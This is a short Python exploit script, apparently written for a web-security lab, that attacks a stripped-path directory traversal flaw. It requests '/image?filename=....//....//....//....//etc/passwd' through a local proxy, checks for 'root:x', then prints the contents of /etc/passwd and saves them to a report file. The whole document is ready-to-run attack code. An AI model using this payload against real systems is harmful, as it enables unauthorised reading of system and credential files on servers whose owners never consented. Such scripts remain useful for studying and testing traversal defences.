import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

# exploit method :
def directory_traversal_exploit(url):
    image_url = url + '/image?filename=....//....//....//....//etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if "root:x" in r.text:
        print('(+) Exploit was sucessful! \n')
        print('(+) The content of the file /etc/passwd : \n')
        print(r.text)

        # storing the exploited result in a report sheet
        with open("Directory_Traversal_Report.txt", "w") as report:
            report.write("(+) Exploit was successful!\n")
            report.write("(+) The following is the content of the /etc/passwd file:\n\n")
            report.write(r.text)

    else:
        print('(+) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example : %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print('(+) Exploitation of directory traversl of stripped path case started')
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()